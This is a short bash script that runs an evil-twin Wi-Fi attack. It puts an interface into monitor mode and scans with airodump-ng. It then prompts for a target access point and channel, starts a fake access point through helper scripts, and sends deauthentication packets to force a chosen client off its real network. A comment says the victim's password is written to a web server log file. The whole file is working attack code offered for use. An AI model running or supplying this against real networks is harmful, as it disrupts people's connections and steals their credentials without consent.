#!/bin/bash

iwconfig
echo -e "\n\nselect interface to put in monitor mode" 
read interface

ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up
airodump-ng $interface

echo -e "\n\nenter the BSSID that you want to attack"
read ap_bssid

echo -e "\n\nenter the taget channel "
read ap_ch

xterm -e ./ap_scan.sh $ap_bssid $ap_ch $interface &

echo -e "\n\nturning on the fake accesspoint"
sleep 5
xterm -e ./fake_ap.sh &


echo -e "\n\nenter the client MAC address you want to disconnect"
read client_mac



python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface

#aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface

#the password will be sent to /var/www/html/mylog file


